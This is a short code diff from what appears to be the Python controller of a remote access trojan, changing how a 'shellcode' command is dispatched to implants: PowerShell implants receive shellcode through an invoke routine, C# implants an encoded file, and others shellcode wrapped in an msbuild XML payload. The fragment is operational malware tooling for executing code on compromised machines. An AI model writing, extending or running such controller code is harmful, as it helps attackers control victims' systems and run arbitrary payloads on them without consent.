@@ -681,8 +681,10 @@ if __name__ == "__main__":
                         elif(str.startswith(inp, "shellcode ")):
                             try:
                                 filepath = inp.split(" ")[1]
-                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
+                                if(types[ratID] == "ps1"):
                                     inp = "shc " +  send_invoke_shellcode(inp, ratID)
+                                elif(types[ratID] == "c#"):
+                                    inp = "shc " + encode_file(filepath)
                                 else:
                                     inp = "shc " + msbuild_path + " " + send_shellcode_msbuild_xml(inp, ratID)
                             except:
